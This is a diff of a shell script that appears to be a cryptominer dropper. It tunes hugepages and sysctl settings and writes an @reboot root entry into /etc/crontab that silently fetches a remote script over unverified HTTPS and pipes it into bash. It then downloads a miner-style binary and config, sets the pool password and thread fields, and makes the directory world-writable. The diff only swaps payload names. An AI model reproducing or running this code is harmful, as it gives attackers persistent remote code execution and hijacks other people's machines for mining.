@@ -15,11 +15,11 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 
 sudo sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1 || sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1
 sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
-sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/mk.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/mk.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 rm -rf "${work}"; mkdir -p "${work}"
-wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
-wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
+wget --no-check-certificate -qO "${work}/config.json" "${src}/csg.json"
+wget --no-check-certificate -qO "${work}/csg" "${src}/csg"
 [ -f "${work}/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "${work}/config.json"
 [ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 chmod -R 777 "${work}"
